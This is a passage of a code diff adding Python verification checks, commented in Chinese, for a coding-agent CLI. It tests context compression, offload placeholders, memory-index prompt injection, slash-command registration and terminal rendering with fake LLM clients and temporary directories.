+        config={"context": {"resume_warmup_enabled": False}},
+        agent=SimpleNamespace(llm_client=None, model="verify-model"),
+        home=tmp, session_id=sid, session_store=store,
+    )
+    conv2 = [m for m in store.get_messages(sid) if m.get("role") != "system"]
+    out2 = _cli._resume_warmup(rt_off, conv2)
+    if any("full_at" in str(m.get("content", ""))
+           for m in out2 if m.get("role") == "tool"):
+        return _fail("开关关了还在跑压缩")
+    if not isinstance(out2[0].get("_timestamp"), float) or "timestamp" in out2[0]:
+        return _fail("开关关闭路径的时间戳盖回/剥离坏了")
+
+    # L4 外围三件（记忆提取/醒来简报/清 surfaced）：真触发 L4 要真 LLM
+    # 摘要（verify 无 API key 不可达），两招兜底——
+    # 1) 结构守卫（弱断言）：inspect 源码里三符号 + _compacted 分支在场，
+    #    防手滑删掉/改名（改了名但行为还在的话守卫会误报，认了）；
+    # 2) 行为断言（强）：把 compress_if_needed 换成假货（offline 直接返回
+    #    compacted=True），用带假 memory_manager/surfaced/队列的假 agent
+    #    验证三件外围真的发生了（_resume_warmup 是函数内 import，patch
+    #    模块属性即可生效，跑完恢复原函数）。
+    import inspect
+    src = inspect.getsource(_cli._resume_warmup)
+    for sym in ("on_pre_compress", "_surfaced_memory_ids",
+                "_pending_ephemeral_messages", "_compacted"):
+        if sym not in src:
+            return _fail(f"_resume_warmup 源码缺 L4 外围符号 {sym}（结构守卫）")
+
+    import agent.context_pipeline as _cp
+    seen = {}
+
+    async def _fake_compress(msgs, **kw):
+        seen["orig"] = msgs           # 压缩函数吃到的原列表对象（别名检测用）
+        seen["expected"] = [dict(m) for m in msgs]  # 压缩前原貌（内容对照用）
+        # 模拟时间清理/冻结层就地改 dict（管线的真实行为）：记忆提取若拿
+        # 到的是别名或共享 dict 的浅列表，旧工具结果会在这儿被换成占位
+        for m in msgs:
+            if m.get("role") == "tool":
+                m["content"] = "[polluted]"
+        # 返回新列表（真压缩会换对象），快照断言才有鉴别力
+        return list(msgs), True, True
+
+    class _MM:
+        def on_pre_compress(self, snapshot_path, messages):
+            seen["mm"] = (snapshot_path, messages)
+
+    _real_compress = _cp.compress_if_needed
+    try:
+        _cp.compress_if_needed = _fake_compress
+        surfaced = {"m1", "m2"}
+        queue = []
+        rt_l4 = SimpleNamespace(
+            config={"context": {"resume_warmup_enabled": True}},
+            agent=SimpleNamespace(
+                llm_client=None, model="verify-model",
+                memory_manager=_MM(),
+                _surfaced_memory_ids=surfaced,
+                _pending_ephemeral_messages=queue,
+            ),
+            home=tmp, session_id=sid, session_store=store,
+        )
+        conv3 = [dict(m) for m in conv if m.get("role") != "system"]
+        _cli._resume_warmup(rt_l4, conv3)
+    finally:
+        _cp.compress_if_needed = _real_compress
+    # 断言 4a：on_pre_compress 吃到的是压缩前快照（snapshot_path=None）：
+    # 1) 不是压缩函数吃到的原列表别名——别名会被管线就地改污染；
+    # 2) 内容与压缩前原貌完全一致——浅拷贝不丢内容，也没被假压缩里的
+    #    就地改动波及（共享 dict 的「假快照」在这儿现原形）
+    mm_call = seen.get("mm")
+    if mm_call is None or mm_call[0] is not None:
+        return _fail("L4 外围：on_pre_compress 没吃到压缩前消息")
+    mm_msgs = mm_call[1]
+    if mm_msgs is seen.get("orig"):
+        return _fail("L4 外围：on_pre_compress 吃到的是别名不是快照（就地改会污染它）")
+    if mm_msgs != seen.get("expected"):
+        return _fail("L4 外围：快照与压缩前原貌不一致（浅拷贝失真/被污染）")
+    # 断言 4b：surfaced 去重集合被清空
+    if surfaced:
+        return _fail(f"L4 外围：_surfaced_memory_ids 没清: {surfaced}")
+    # 断言 4c：醒来简报进了 ephemeral 队列（恰好一条、带 _ephemeral 标记）
+    briefs = [m for m in queue if "post_compress_brief" in str(m.get("content", ""))]
+    if len(briefs) != 1 or not briefs[0].get("_ephemeral"):
+        return _fail(f"L4 外围：醒来简报没进 ephemeral 队列: {queue}")
+    return _ok(
+        f"预热盖回 _timestamp + 折占位 {n_placeholder} 条 + 双键已剥"
+        "（含开关关闭路径）+ L4 外围三件（结构守卫 + 假压缩行为断言）"
+    )
+
+
+def check_msgs_cache_lru(tmp):
+    """验证消息缓存有淘汰：加载 20 个会话后容量不超过上限（防常驻内存无限涨）。"""
+    from agent.session_store import SessionStore, _MSGS_CACHE_CAP
+    store = SessionStore(tmp / "lru_sessions")
+    for i in range(_MSGS_CACHE_CAP + 4):
+        sid = store.create_session(title=f"s{i}", model="t")
+        store.append_message(sid, "user", f"hello {i}")
+        store.get_messages(sid)  # 触发加载进缓存
+    if len(store._msgs_cache) > _MSGS_CACHE_CAP:
+        return _fail(f"缓存无淘汰: {len(store._msgs_cache)} > {_MSGS_CACHE_CAP}")
+    return _ok(f"LRU 生效（容量 {len(store._msgs_cache)} ≤ {_MSGS_CACHE_CAP}）")
+
+
+# ---------------------------------------------------------------------------
+# 上下文压缩
+# ---------------------------------------------------------------------------
+
+def check_context_compress():
+    """验证上下文压缩：消息条数超阈值时新管线会把历史压短（LLM 用假实现）。
+
+    这里把触发阈值调得很低，确保压缩一定会发生；再给一个记录型的假
+    会话库，断言 L4 成功后 [COMPACT_BOUNDARY] 边界真的落了库——
+    不落库的话压完重启恢复全量载入，压缩等于白压（落库接线回归）。
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.context_pipeline import compress_if_needed, CompressionSessionState
+    from config import DEFAULT_CONFIG
+
+    # 假 LLM 客户端：_summarize_conversation 认的是异步 chat_completions
+    # 接口（fork 前缀 / 独立调用两条路都走它），返回固定摘要文本
+    async def fake_chat_completions(messages, **kw):
+        return SimpleNamespace(
+            choices=[SimpleNamespace(
+                message=SimpleNamespace(content="总结内容：这是测试摘要。")
+            )]
+        )
+
+    client = SimpleNamespace(chat_completions=fake_chat_completions)
+
+    msgs = [{"role": "system", "content": "sys"}]
+    for i in range(30):
+        # 内容塞长一点：被摘要段必须比摘要占位大，L4 收敛检查才过得去
+        msgs.append({"role": "user", "content": f"消息 {i} " + "细节" * 20})
+        msgs.append({"role": "assistant", "content": f"回复 {i} " + "答复" * 20})
+
+    ctx_cfg = dict(DEFAULT_CONFIG.get("context", {}))
+    # 把触发阈值调低到必触发，否则样例对话不够长压不动
+    ctx_cfg["snip_message_threshold"] = 50
+    # token 阈值压到 1：强制走 L4（假 LLM 摘要）成功路径，才验得到边界落库
+    ctx_cfg["llm_compact_token_threshold"] = 1
+    # agent_home=None 落不了 transcript 快照，干脆关掉省 WARNING 噪音
+    ctx_cfg["transcript_enabled"] = False
+    state = CompressionSessionState()
+    # 假会话库：只记录 append_message 的调用，最后断言边界标记真落了库
+    recorded = []
+
+    def _fake_append(sid, role, text, **kw):
+        recorded.append((sid, role, text))
+
+    fake_store = SimpleNamespace(append_message=_fake_append)
+    new_msgs, compressed, _compacted = asyncio.run(compress_if_needed(
+        msgs,
+        llm_client=client,
+        model="deepseek-chat",
+        config=ctx_cfg,
+        session_state=state,
+        agent_home=None,
+        session_id="verify",
+        session_store=fake_store,
+    ))
+    if not (compressed and len(new_msgs) < len(msgs)):
+        return _fail("未压缩")
+    boundaries = [t for (_s, _r, t) in recorded if t.startswith("[COMPACT_BOUNDARY]")]
+    if not boundaries:
+        return _fail(f"L4 压缩成功但边界没落库（会话库记录 {len(recorded)} 条）")
+    return _ok(
+        f"{len(msgs)} → {len(new_msgs)} 条，边界已落库（共 {len(recorded)} 条标记）"
+    )
+
+
+def check_compress_profile():
+    """验证单遍 profile 统计正确（触发判定改吃它的前提）。"""
+    from agent.context_pipeline import _profile_messages
+    msgs = [
+        {"role": "system", "content": "sys"},
+        {"role": "user", "content": "问"},
+        {"role": "assistant", "content": "答", "_timestamp": 111},
+        {"role": "tool", "content": "T" * 300},
+        {"role": "tool", "content": "T" * 500},
+        {"role": "assistant", "content": "答2", "_timestamp": 222},
+    ]
+    p = _profile_messages(msgs)
+    if p["msg_count"] != 5:
+        return _fail(f"msg_count 不对（system 不计）: {p['msg_count']}")
+    if p["total_chars"] != 1 + 1 + 300 + 500 + 2:
+        return _fail(f"total_chars 不对: {p['total_chars']}")
+    if p["max_tool_chars"] != 500:
+        return _fail(f"max_tool_chars 不对: {p['max_tool_chars']}")
+    if p["last_assistant_ts"] != 222:
+        return _fail(f"last_assistant_ts 不对: {p['last_assistant_ts']}")
+    empty = _profile_messages([{"role": "system", "content": "s"}])
+    if empty["msg_count"] != 0 or empty["last_assistant_ts"] is not None:
+        return _fail(f"空会话 profile 不对: {empty}")
+    return _ok("profile 单遍统计正确")
+
+
+def check_time_clear_pointer(tmp):
+    """验证 60 分钟清理的占位带 full_at 找回指针（agent_home 在场时）。
+
+    旧版时间清理把旧工具结果换成纯文本占位（半丢失）；新版清空前先
+    maybe_offload 落盘，占位升级成 offload JSON（预览 + full_at 文件指针），
+    模型想看全文可自己读回。agent_home=None 时退回纯文本占位（测试兼容）。
+    """
+    import time as _t
+    from agent.context_pipeline import time_based_clear_old_tool_results
+    old = _t.time() - 3600 * 3
+    msgs = [{"role": "system", "content": "s"}]
+    for i in range(8):
+        msgs.append({"role": "tool", "content": f"R{i}" + "X" * 800,
+                     "tool_call_id": f"tc{i}", "_timestamp": old})
+    msgs.append({"role": "assistant", "content": "done", "_timestamp": old})
+    out, changed = time_based_clear_old_tool_results(
+        [dict(m) for m in msgs], {}, agent_home=tmp)
+    if not changed:
+        return _fail("时间清理没触发")
+    body = "".join(str(m.get("content", "")) for m in out[:6])
+    if "full_at" not in body:
+        return _fail(f"占位缺找回指针: {body[:120]}")
+    import json as _j
+    ph = next(m for m in out if isinstance(m.get("content"), str) and "full_at" in m["content"])
+    fa = _j.loads(ph["content"]).get("full_at")
+    if not Path(fa).exists():
+        return _fail(f"落盘文件不存在: {fa}")
+    # 幂等双跑：已清占位（前缀指纹 {"truncated": true）再跑一遍必须零变化——
+    # 防 maybe_offload payload 改键序/改名后前缀指纹静默失配（占位被二次
+    # 处理 = 指针套指针），56 项也不报的那种回归
+    out_again, ch_again = time_based_clear_old_tool_results(
+        [dict(m) for m in out], {}, agent_home=tmp)
+    if ch_again or [m.get("content") for m in out_again] != [m.get("content") for m in out]:
+        return _fail("幂等破坏：已清占位被二次处理（前缀指纹失配？）")
+    # agent_home=None 退回旧占位（测试兼容路径）。旧写法「ch2 and all(...)」
+    # 有个洞：ch2=False（清理压根没触发）时整条也判过——等于没测。强负例
+    # 先把「必须真的清了」钉死，再验占位形状退回了纯文本老占位
+    out2, ch2 = time_based_clear_old_tool_results(
+        [dict(m) for m in msgs], {})
+    if not ch2:
+        return _fail("None 路径该正常触发清理")
+    if not any(m.get("content") == "[Old tool result content cleared]" for m in out2):
+        return _fail("None 路径没退回旧占位")
+    # 小内容下限：<200 字符的短结果不值得 offload——JSON 占位（~300 字符）
+    # 反而比原文费 token、落盘也没找回价值，应直接退纯 CLEARED_MARK 不落盘。
+    # 构造 8 条 50 字符旧结果 + agent_home：8 条保最近 5 条 → 前 3 条该清，
+    # 清了的必须全是纯占位（一个 full_at 都不该出现）
+    small = [{"role": "system", "content": "s"}]
+    for i in range(8):
+        small.append({"role": "tool", "content": f"S{i}" + "s" * 48,
+                      "tool_call_id": f"stc{i}", "_timestamp": old})
+    small.append({"role": "assistant", "content": "done", "_timestamp": old})
+    out3, ch3 = time_based_clear_old_tool_results(
+        [dict(m) for m in small], {}, agent_home=tmp)
+    if not ch3:
+        return _fail("小内容路径该正常触发清理")
+    marks3 = [
+        m for m in out3
+        if m.get("content") == "[Old tool result content cleared]"
+    ]
+    if len(marks3) != 3:
+        return _fail(f"小内容应清 3 条纯占位（保最近 5 条），实际 {len(marks3)} 条")
+    if any("full_at" in str(m.get("content", "")) for m in out3):
+        return _fail("小内容不该走 offload 落盘（出现了 full_at 占位）")
+    return _ok("时间清理占位带指针")
+
+
+def check_low_threshold_offload_equivalence(tmp):
+    """低 offload 阈值下 L2/L2.5/L2.6 守卫仍放行现场重算（R4T6 守卫回归门）。
+
+    背景：压缩管线的各层触发判定吃 profile 统计量（省扫描），但强制
+    落盘对短消息（内容 ≤ 预览长度）是「全文 + JSON 包装」替换、净变长
+    ~270 字符/条——低 offload 阈值配置下 profile 会低估现场总量。
+    本门防的是「profile 早退门跳过本应触发的现场重算」（R4T6 修复的
+    守卫回归）：L2.6 的守卫臂（or c0 or c_freeze or c2 or c_per_msg）
+    必须在前层动过消息时放行现场重算，否则 L2 折叠后现场总量超预算
+    无人管（等价破坏）。
+
+    为什么预算是 80000（2026-09 实测数字）：40 条 1900 字符工具结果，
+    profile 总量 76001+slack(16×82=1312)≈77.3k；L2 折 37 条（留最近
+    3 条保护圈）后现场总量 ~84.5k。80000 正好卡在 profile 低估与现场
+    真值之间——
+      守卫在场：c2=True 放行现场重算 → L2.6 补折 3 条保护圈，占位 40
+        处、现场总量 86630 ≤ 80000×1.1（折短消息净变长，压不回 80000
+        整，×1.1 富余盖住 40 条落盘 JSON 包装的开销）；
+      守卫被删：只剩 profile 臂，77.3k < 80k 不触发 → 只折 L2 的 37
+        条、现场总量 85.8k 超预算无人管 → 占位 37 < 38 断言 FAIL。
+    删守卫会 FAIL 已本地实测（临时摘掉守卫臂跑同场景：占位 40 → 37）。
+    注意总量断言单独并不带电（守卫被删时 85.8k 也在 1.1 内）——本门
+    的电来自占位计数那条臂，两个条件同时断言缺一不可。
+
+    参数：
+        tmp  临时目录 Path（落盘文件写在 tmp/.task_outputs/ 下）
+
+    返回：PASS/FAIL 结果。
+    """
+    from agent.context_pipeline import (
+        compress_if_needed, CompressionSessionState, reset_offload_decisions,
+    )
+    import time as _t
+
+    # 冻结决策表是模块级全局（跨检查共享），先清空保证本检查从零开始
+    # （别的检查若碰巧用过 c0..c39 这类 id，照抄旧预览会搅乱断言）
+    reset_offload_decisions()
+
+    # 40 条 1900 字符工具结果：低阈值（1000）下 L2 会把它们折成
+    # 「全文+包装」（净变长），L2.6 的守卫臂必须放行现场重算而不是
+    # 被 profile 统计跳过（llm_client=None 时 L4 不触发，验的是无损层）
+    msgs = [{"role": "system", "content": "s"}]
+    msgs.append({"role": "user", "content": "go", "_timestamp": _t.time()})
+    for i in range(40):
+        msgs.append({"role": "assistant", "content": "",
+                     "tool_calls": [{"id": f"c{i}", "function": {
+                         "name": "t", "arguments": "{}"}}],
+                     "_timestamp": _t.time()})
+        msgs.append({"role": "tool", "content": "X" * 1900,
+                     "tool_call_id": f"c{i}", "_timestamp": _t.time()})
+    budget = 80000
+    new_msgs, changed, _ = asyncio.run(compress_if_needed(
+        msgs, llm_client=None, model="deepseek-chat",
+        config={"output_offload_threshold": 1000,
+                "tool_result_total_budget": budget},
+        session_state=CompressionSessionState(),
+        agent_home=tmp, session_id="verify-low-th",
+    ))
+    # 断言 (a)：必须变化。落盘发生了但 changed=False 是记账 bug（调用方
+    # 靠 changed 把新消息同步回对话历史，False 等于白折）——旧版
+    # 「not changed 且占位在场也算过」的宽松象限已删
+    if not changed:
+        return _fail("无损层折叠了却不报 changed（记账 bug，新历史不会被同步回对话）")
+    tool_msgs = [m for m in new_msgs if m.get("role") == "tool"]
+    n_placeholders = sum(
+        str(m.get("content", "")).count('"full_at"') for m in tool_msgs)
+    tool_total = sum(len(str(m.get("content", ""))) for m in tool_msgs)
+    if n_placeholders == 0:
+        return _fail("changed 但没有落盘占位，行为异常")
+    # 断言 (b)：占位条数。实测 40（L2 折 37 + L2.6 补折 3 条保护圈）；
+    # >= 38 是对守卫敏感的形状——守卫被删时 L2.6 不触发、只剩 37 处
+    if n_placeholders < 38:
+        return _fail(
+            f"落盘占位仅 {n_placeholders} 处（应 40：L2 折 37 + L2.6 补折"
+            " 3 条保护圈）——守卫回归：profile 早退门跳过了本应触发的现场重算")
+    # 断言 (c)：现场总量压回预算×1.1 内（实测 86630）。与 (b) 同时成立
+    # 才算过门——这条单独不带电（守卫被删时 85.8k 也过），撑住的是
+    # 「现场重算真把总量管住了」的语义
+    if tool_total > budget * 1.1:
+        return _fail(
+            f"现场总量 {tool_total} 超预算×1.1（{int(budget * 1.1)}）无人管")
+    return _ok(
+        f"占位 {n_placeholders} 处、现场总量 {tool_total} ≤ {int(budget * 1.1)}"
+        "（守卫敏感形状过门）"
+    )
+
+
+# ---------------------------------------------------------------------------
+# slash 命令注册表
+# ---------------------------------------------------------------------------
+
+def check_slash_registry():
+    """验证 slash 命令注册表：命令一条没丢、每个 handler 都可调用。"""
+    import cli_commands as cc
+    # 触发命令模块 import（自登记发生在 import 时）
+    import cli  # noqa: F401
+    import cli_diag_cmds  # noqa: F401
+    import cli_session_cmds  # noqa: F401
+    import cli_skill_memory_cmds  # noqa: F401
+    cmds = cc.all_commands()
+    if len(cmds) < 37:
+        return _fail(f"注册表只有 {len(cmds)} 条（基线 37），命令迁移丢了")
+    for c in cmds:
+        if not callable(c.handler):
+            return _fail(f"命令 {c.name} 的 handler 不可调用")
+    return _ok(f"{len(cmds)} 条命令全部登记，handler 可调用")
+
+
+def check_cli_completer():
+    """验证三级补全器：命令名/参数两级都能出候选，异常不外泄。"""
+    from prompt_toolkit.document import Document
+    from prompt_toolkit.completion import CompleteEvent
+    import cli_commands as cc
+    import cli  # noqa: F401  触发自登记
+    import cli_diag_cmds, cli_session_cmds, cli_skill_memory_cmds  # noqa: F401
+    from cli_layout import SlashCompleter
+
+    # amap 只算一次，构造补全器和二级检查共用同一份数据
+    amap = cc.arg_completer_map()
+    comp = SlashCompleter(
+        registry_tokens=cc.all_tokens(),
+        arg_completers=amap,
+        dynamic_tokens_fn=lambda: [],
+        meta_fn=lambda t: (getattr(cc.lookup(t), "summary", "") or ""),
+        # ↑ 真实接法同款：注册表 token → 一句话 summary（菜单右列）
+    )
+    got = [c.text for c in comp.get_completions(Document("/hel"), CompleteEvent())]
+    if "/help" not in got:
+        return _fail(f"一级补全没出 /help：{got[:5]}")
+    # display_meta（菜单右列描述）：meta_fn 给了就有——补全菜单才像
+    # claude code 那样「命令 + 一句说明」两列
+    got_meta = [
+        c.display_meta_text for c in comp.get_completions(
+            Document("/hel"), CompleteEvent())
+    ]
+    if not any(m.strip() for m in got_meta):
+        return _fail(f"补全项缺描述（display_meta 全空）：{got_meta[:5]}")
+    if not amap:
+        return _ok("一级补全正常；二级未实测（暂无命令登记参数补全器）")
+    # 二级：逐个验证登记了参数补全器的命令（候选能出才算过——
+    # 补全器返回了候选却一个都没渲染出来就是真 bug）
+    for token, fn in amap.items():
+        cands = [c.text for c in comp.get_completions(
+            Document(f"{token} "), CompleteEvent())]
+        if not cands and fn(f"{token} "):
+            return _fail(f"{token} 的参数补全没出候选")
+    return _ok("三级补全器两级候选正常")
+
+
+def check_memory_index_in_prompt(tmp):
+    """验证记忆索引常驻注入：system prompt 含索引快照（截断）；反思回执投递。"""
+    import os as _os
+    from agent.memory_store import MemoryStore
+    from agent.prompt_builder import build_system_prompt_layers
+    from agent import reflection as _refl
+
+    # 隔离环境：项目键按 cwd 算，固定到 tmp 下防污染真机项目区
+    _old_cwd = os.getcwd()
+    _os.chdir(tmp)
+    _old_home = _os.environ.get("CODEAGENT_HOME")
+    _os.environ["CODEAGENT_HOME"] = str(tmp)
+    try:
+        store = MemoryStore(codeagent_home=tmp)
+        store.save(name="用户爱用 pytest", description="测试框架是 pytest",
+                   type="user", topic="工具链")
+        store.save(name="提交前跑 verify", description="改完代码先跑 scripts/verify.py",
+                   type="feedback", topic="流程")
+        snap = store.snapshot_for_prompt()
+        if "用户爱用 pytest" not in snap or "提交前跑 verify" not in snap:
+            return _fail(f"索引快照缺条目: {snap[:200]!r}")
+
+        # ⭐ 只给用户确认过的 feedback：自学习经验（反思引擎写的 source=self）
+        # 不戴冠、排序降一档——防幻觉判定被自学习固化后顶格注入毒害后续会话
+        store.save(name="自学习经验甲", description="模型自总结的",
+                   type="feedback", topic="流程", source="self")
+        store.save(name="用户拍板乙", description="用户纠正过的",
+                   type="feedback", topic="流程", source="user")
+        snap2_lines = store.snapshot_for_prompt().splitlines()
+        star_line = next((ln for ln in snap2_lines if "用户拍板乙" in ln), "")
+        self_line = next((ln for ln in snap2_lines if "自学习经验甲" in ln), "")
+        if not star_line.startswith("- ⭐"):
+            return _fail(f"用户确认 feedback 该戴 ⭐: {star_line!r}")
+        if "⭐" in self_line:
+            return _fail(f"自学习 feedback 不该戴 ⭐: {self_line!r}")
+        if snap2_lines.index(self_line) < snap2_lines.index(star_line):
+            return _fail("自学习 feedback 不该排在用户确认的 feedback 前面")
+        if "未经用户确认" not in "\n".join(snap2_lines[:6]):
+            return _fail("索引头缺「自学习经验未经用户确认」说明文案")
+
+        # 注入 system prompt：context 层带索引节；不传 store 不炸也不带
+        layers = build_system_prompt_layers(memory_store=store)
+        if "记忆索引（已有长期记忆清单" not in layers.context \
+                or "用户爱用 pytest" not in layers.context:
+            return _fail("system prompt 的 context 层缺记忆索引")
+        # 「用户显式路径永远优先于记忆项目」防御（问 A 项目答 B 项目事故的
+        # 回归栏栅）：索引节、索引头、检索注入头、反思分类规则四处都要在
+        if "永远优先" not in layers.context:
+            return _fail("索引注入缺「用户路径永远优先」防御文案")
+        if "永远优先" not in store.snapshot_for_prompt():
+            return _fail("MEMORY.md 索引头缺防御文案")
+        import agent.memory_injection as _mi
+        import inspect as _insp
+        if "永远优先" not in _insp.getsource(_mi):
+            return _fail("检索注入头缺防御文案")
+        # 记忆归属规则（用户拍板）：跟工作目录走——分析外部项目取回的
+        # 技术也是当前工作的一部分，照常落当前项目区，不改类不换区
+        import agent.reflection as _refl
+        if "跟着当前工作目录走" not in _refl.REFLECTION_PROMPT_TEMPLATE:
+            return _fail("反思模板缺「记忆跟工作目录走」归属规则")
+        # 防幻觉判定固化：把输入判为乱码/注入而拒绝执行是一次性防御动作，
+        # 不得沉淀成经验（真案：flash 模型幻觉宣判干净消息为乱码，反思
+        # 把它学成 ⭐feedback 毒害后续会话）
+        if "不入记忆" not in _refl.REFLECTION_PROMPT_TEMPLATE \
+                or "误伤" not in _refl.REFLECTION_PROMPT_TEMPLATE:
+            return _fail("反思模板缺「拒绝/判可疑行为不入记忆」防线")
+        bare = build_system_prompt_layers(memory_store=None)
+        if "记忆索引（已有长期记忆清单" in bare.context:
+            return _fail("没传 memory_store 也不该有索引节")
+
+        # 截断：灌 210 条（每条 1 行）→ 索引超 200 行被截
+        for i in range(210):
+            store.save(name=f"条目{i:03d}", description="x", type="other",
+                       topic="压测")
+        if "超出行数上限" not in store.snapshot_for_prompt():
+            return _fail("索引超 200 行没有截断标记")
+
+        # 反思回执：写库成功 → 临时消息队列出现 [memory-saved]；0 条不打扰
+        fake_agent = SimpleNamespace(_pending_ephemeral_messages=[])
+        _refl._notify_memory_saved(fake_agent, 3)
+        if len(fake_agent._pending_ephemeral_messages) != 1:
+            return _fail("回执没进临时消息队列")
+        notice = fake_agent._pending_ephemeral_messages[0]
+        if "[memory-saved]" not in notice["content"] or "3 条" not in notice["content"] \
+                or notice.get("_ephemeral") is not True:
+            return _fail(f"回执消息长相不对: {notice}")
+        _refl._notify_memory_saved(fake_agent, 0)
+        if len(fake_agent._pending_ephemeral_messages) != 1:
+            return _fail("0 条写入不该发回执")
+
+        # supersedes/confidence 规范化不丢字段（推翻机制曾因此死代码）
+        fake_out = [{
+            "type": "feedback", "name": "改用 pip", "description": "x",
+            "summary": "s", "body": "b",
+            "confidence": 1.0, "supersedes": " 用 uv 不用 pip ",
+        }]
+        normed = _refl._normalize_insights(fake_out)
+        if not normed or normed[0].get("supersedes") != "用 uv 不用 pip" \
+                or normed[0].get("confidence") != 1.0:
+            return _fail(f"规范化丢了 supersedes/confidence: {normed}")
+        # 坏 confidence 不炸整个反思
+        normed2 = _refl._normalize_insights([
+            {"type": "user", "name": "n", "description": "d",
+             "confidence": "垃圾"}])
+        if len(normed2) != 1 or normed2[0].get("confidence") != 0.8:
+            return _fail(f"坏 confidence 应兜底 0.8: {normed2}")
+
+        # 中文主题不坍缩：两个不同中文主题必须落两个文件、互不覆盖
+        # （旧清洗规则把中文全变 "-"，全都挤进同一个 "--.jsonl" 互踩）
+        store.save(name="主题A条目", description="d1", type="user", topic="偏好")
+        store.save(name="主题A条目", description="d2", type="user", topic="反馈")
+        snap3 = store.full_index_text()
+        if snap3.count("主题A条目") != 2 or "d2" not in snap3:
+            return _fail(f"中文主题坍缩互相覆盖: {snap3[:200]!r}")
+
+        # source 粘滞：self 条目被同名 save 不升档（防自学习经验被写成"用户确认"戴 ⭐）
+        store.save(name="粘滞测试", description="v1", type="feedback",
+                   topic="流程", source="self")
+        store.save(name="粘滞测试", description="v2", type="feedback",
+                   topic="流程")  # 默认 user，不该顶掉原条目的 self
+        # 注意用 full_index_text（不截断）：上面灌过 210 条，截断版 snapshot 里
+        # 排在"压测"后面的主题根本挤不进前 200 行
+        snap4 = store.full_index_text()
+        line4 = next((ln for ln in snap4.splitlines() if "粘滞测试" in ln), "")
+        if not line4 or "⭐" in line4:
+            return _fail(f"self 条目被同名 save 升档成 ⭐: {line4!r}")
+
+        # 读失败不投毒缓存：写一个 GBK 文件再读——读失败返回空列表但绝不进缓存
+        # （投毒后果：假空缓存被当新鲜，同主题任何重写 = 整文件物理清空）
+        bad_topic = "坏行测试"
+        bad_path = store._topic_path(bad_topic)
+        bad_path.write_bytes("中文但gbk编码".encode("gbk"))
+        if store._read_topic_rows(bad_topic) != []:
+            return _fail("GBK 坏文件该返回空列表")
+        # _rows_cache 的键是 (分区目录字符串, 主题)——全局区分目录是空串
+        if any(k[1] == bad_topic for k in store._rows_cache):
+            return _fail("读失败后不该把空列表缓存（投毒）")
+        return _ok("索引常驻注入+截断+反思回执+规范化不丢字段正常")
+    finally:
+        _os.chdir(_old_cwd)
+        if _old_home is None:
+            _os.environ.pop("CODEAGENT_HOME", None)
+        else:
+            _os.environ["CODEAGENT_HOME"] = _old_home
+
+
+def check_event_lines():
+    """验证事件行渲染器：claude code 风格 ● 头行 + ⎿ 结果块 + 带行号 diff。"""
+    import json as _json
+    import cli_events as ce
+    head = ce.format_tool_line("terminal", {"command": "pytest -q"}, 4.06,
+                               '{"stdout": "ok"}')
+    if "● Bash(pytest -q)" not in head:
+        return _fail(f"工具头行不对（应 ● Bash(命令)）：{head!r}")
+    bad = ce.format_tool_line("terminal", {"command": "boom"}, 0.2,
+                              '{"error": "exit 1"}')
+    if "✗" not in bad:
+        return _fail(f"失败头行缺 ✗：{bad!r}")
+    # 摘要字段名对齐工具 schema（read_file 用 path 不是 file_path）
+    rl = ce.format_tool_line("read_file", {"path": "src/app.py"}, 0.05, None)
+    if "● Read(src/app.py)" not in rl:
+        return _fail(f"read 头行缺路径摘要（字段名对不上 schema？）：{rl!r}")
+    # write_file：覆盖已有文件 → Update；新文件 → Write
+    if "Update(" not in ce.format_tool_line(
+            "write_file", {"path": "a.py"}, 0.1, "{}", is_update=True):
+        return _fail("write_file 覆盖已有文件应显示 Update")
+    if "Write(" not in ce.format_tool_line(
+            "write_file", {"path": "a.py"}, 0.1, "{}"):
+        return _fail("write_file 新文件应显示 Write")
+    # 结果块：stdout 预览 + 折叠提示（5 行只展示 3 行，剩 2 行折叠）
+    blk = ce.format_result_block("terminal", _json.dumps(
+        {"stdout": "l1\nl2\nl3\nl4\nl5\n"}))
+    btext = "\n".join(t for _, t in blk)
+    if "l1" not in btext or "+2 lines" not in btext or not \
+            any(t.startswith("  ") for _, t in blk):
+        return _fail(f"stdout 预览块不对：{blk}")
+    err = ce.format_result_block("terminal", '{"error": "exit 1"}')
+    if "✗" not in err[0][1] or "exit 1" not in err[0][1]:
+        return _fail(f"错误块不对：{err}")
+    rd = ce.format_result_block("read_file", '{"total_lines": 135}')
+    if "Read 135 lines" not in rd[0][1]:
+        return _fail(f"read 块不对：{rd}")
+    # 带行号 diff：红删绿增 + 截断提示 + 行号必须是整数
+    d = ce.build_numbered_diff("a\nb\nc\n", "a\nX\nc\nd\n")
+    kinds = [k for k, _, _ in d]
+    if "-" not in kinds or "+" not in kinds:
+        return _fail(f"diff 缺删/增行：{d}")
+    if not all(isinstance(no, int) for k, no, _ in d if k in " +-"):
+        return _fail(f"diff 行号不是整数：{d}")
+    dcap = ce.build_numbered_diff(
+        "", "\n".join(f"line{i}" for i in range(100)))
+    if not any(k == "…" for k, _, _ in dcap):
+        return _fail("diff 超长没有截断提示")
+    if ce._diff_counts("a\nb\n", "a\n") != (0, 1):
+        return _fail("_diff_counts 数错了")
+    p = ce.EventPairer()
+    p.record("x", {})
+    if p.pop("x", {}) is None or p.pop("x", {}) is not None:
+        return _fail("配对队列进出异常")
+    import cli_session_cmds
+    if hasattr(cli_session_cmds, "_maybe_prompt_resume"):
+        return _fail("启动询问函数 _maybe_prompt_resume 还在")
+    return _ok("claude code 风格事件行（头行+结果块+行号diff）正常")
+
+
+def check_stream_box():
+    """验证流式渲染：无框直排、思考押后先行、CJK 表格重排。"""
+    from cli_stream import StreamBoxRenderer
+
+    got = []
+    r = StreamBoxRenderer(print_fn=got.append)
+
+    # 思考流 → 正文（押后）：思考必须排在正文前面
+    r.on_event({"type": "reasoning", "delta": "先想一想\n"})
+    r.on_event({"type": "content", "delta": "| 名字 | 数量 |\n|---|---|\n"})
+    r.on_event({"type": "content",
+                "delta": "| 苹果 | 1 |\n| 香蕉香蕉 | 22 |\n\n"})
+    r.on_event({"type": "content", "delta": "回答结束"})
+    r.on_event({"type": "done"})
+    # 剥掉 ANSI 色码再断言
+    import re
+    text = re.sub(r"\x1b\[[0-9;]*m", "", "\n".join(got))
+
+    if "先想一想" not in text:
+        return _fail(f"思考流丢失：{text[:120]!r}")
+    if text.index("先想一想") > text.index("| 名字"):
+        return _fail("思考必须排在正文前面")
+    # 无框直排：不允许再出现任何框线
+    for frag in ("╭─", "╰", "┌─", "└"):
+        if frag in text:
+            return _fail(f"还有框线 {frag!r}（应为无框直排）")
+    if "回答结束" not in text:
